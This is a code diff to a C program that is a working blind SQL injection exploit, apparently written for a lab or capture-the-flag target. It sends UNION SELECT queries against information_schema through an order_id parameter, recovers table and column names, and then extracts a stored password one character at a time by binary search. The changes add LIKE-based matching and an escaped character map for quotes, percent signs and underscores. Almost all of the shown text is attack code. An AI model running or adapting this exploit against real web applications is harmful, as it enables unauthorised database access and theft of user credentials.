@@ -209,6 +209,7 @@ typedef bool (*check_func_t)(const void *ctx);
 typedef struct {
     int sockfd;
     char *discovered;
+    char *discovered_like;
     int index;
     const char *guess;
 } GeneralCtx;
@@ -256,7 +257,7 @@ bool check_column(const void *ctx) {
     const char *fmt =
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20column_name%%20"
         "FROM%%20information_schema.COLUMNS%%20"
-        "WHERE%%20table_name%%3d%%27%s%%27%%20" // %s = table_name
+        "WHERE%%20table_name%%20LIKE%%20%%27%s%%27%%20" // %s = table_name
         "AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find
         "AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered
         "AND%%20CHAR_LENGTH(column_name)>CHAR_LENGTH(%%27%s%%27)%%20"
@@ -311,16 +312,15 @@ bool check_password(const void *ctx) {
     return recv_empty(d_ctx->gen_ctx.sockfd);
 }
 
-
-const char *url_map[96] = {
+const char *url_map_like[96] = {
     "%20", // 0x20 Space
     "%21", // 0x21 !
-    "%22", // 0x22 "
+    "%5C%22", // 0x22 "
     "%23", // 0x23 #
     "%24", // 0x24 $
-    "%25", // 0x25 %
+    "%5C%25", // 0x25 %
     "%26", // 0x26 &
-    "%27", // 0x27 '
+    "%5C%27", // 0x27 ' (escaped)
     "%28", // 0x28 (
     "%29", // 0x29 )
     "%2A", // 0x2A *
@@ -348,7 +348,61 @@ const char *url_map[96] = {
 
     // --- 0x5B to 0x60 ---
     "%5B", // 0x5B [
-    "%5C", // 0x5C \ (Backslash)
+    "%5C%5C", // 0x5C \ (Backslash)
+    "%5D", // 0x5D ]
+    "%5E", // 0x5E ^
+    "%5C%5F", // 0x5F _
+    "%60", // 0x60 `
+
+    // --- 0x61 to 0x7A (Lowercase a-z Unreserved) ---
+    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
+    "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
+
+    // --- 0x7B to 0x7F ---
+    "%7B", // 0x7B {
+    "%7C", // 0x7C |
+    "%7D", // 0x7D }
+    "~",   // 0x7E ~ (Unreserved)
+    "%7F"  // 0x7F DEL
+};
+
+/*const char *url_map_single_quote[96] = {
+    "%20", // 0x20 Space
+    "%21", // 0x21 !
+    "%5C%22", // 0x22 "
+    "%23", // 0x23 #
+    "%24", // 0x24 $
+    "%25", // 0x25 %
+    "%26", // 0x26 &
+    "%5C%27", // 0x27 ' (escaped)
+    "%28", // 0x28 (
+    "%29", // 0x29 )
+    "%2A", // 0x2A *
+    "%2B", // 0x2B +
+    "%2C", // 0x2C ,
+    "-",   // 0x2D -
+    ".",   // 0x2E .
+    "%2F", // 0x2F /
+
+    // --- 0x30 to 0x39 (Numbers 0-9 Unreserved) ---
+    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
+
+    // --- 0x3A to 0x40 ---
+    "%3A", // 0x3A :
+    "%3B", // 0x3B ;
+    "%3C", // 0x3C <
+    "%3D", // 0x3D =
+    "%3E", // 0x3E >
+    "%3F", // 0x3F ?
+    "%40", // 0x40 @
+
+    // --- 0x41 to 0x5A (Uppercase A-Z Unreserved) ---
+    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
+    "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
+
+    // --- 0x5B to 0x60 ---
+    "%5B", // 0x5B [
+    "%5C%5C", // 0x5C \ (Backslash)
     "%5D", // 0x5D ]
     "%5E", // 0x5E ^
     "%5F", // 0x5F _
@@ -364,7 +418,7 @@ const char *url_map[96] = {
     "%7D", // 0x7D }
     "~",   // 0x7E ~ (Unreserved)
     "%7F"  // 0x7F DEL
-};
+};*/
 
 void binary_search(check_func_t check_fn, void *ctx) {
     GeneralCtx *gen_ctx = (GeneralCtx *)ctx;
@@ -385,7 +439,7 @@ void binary_search(check_func_t check_fn, void *ctx) {
             count++;
         #endif
             gen_ctx->index = i;
-            gen_ctx->guess = url_map[mid];
+            gen_ctx->guess = url_map_like[mid];
             if (check_fn(ctx)) {
                 high=mid;
             } else {
@@ -401,7 +455,7 @@ void binary_search(check_func_t check_fn, void *ctx) {
             #endif
             break;
         }
-        strcat(gen_ctx->discovered, url_map[low]);
+        strcat(gen_ctx->discovered, url_map_like[low]);
     }
 #ifdef __MY_DEBUG__
     printf("number of queries is: %d\n",count);
@@ -413,7 +467,7 @@ int32_t main() {
     _connect(sockfd, WEB_ADDR, 80);
 
 
-    char table_name[31] = {0};
+    char table_name[61] = {0};
     {
         GeneralCtx table_ctx = {
             .sockfd = sockfd,
@@ -427,7 +481,7 @@ int32_t main() {
         printf("Found Table: %s\n", table_name);
     #endif
 
-    char id_name[31] = {0};
+    char id_name[61] = {0};
     {
         ColumnCtx id_ctx = {
             .gen_ctx = {
@@ -441,7 +495,7 @@ int32_t main() {
         binary_search(check_column, &id_ctx);
     }
 
-    char pwd_name[31] = {0};
+    char pwd_name[61] = {0};
     {
         ColumnCtx pwd_col_ctx = {
             .gen_ctx = {
@@ -455,7 +509,7 @@ int32_t main() {
         binary_search(check_column, &pwd_col_ctx);
     }
 
-    char final_password[31] = {0};
+    char final_password[61] = {0};
     {
         PwdCtx pwd_ctx = {
             .gen_ctx = {
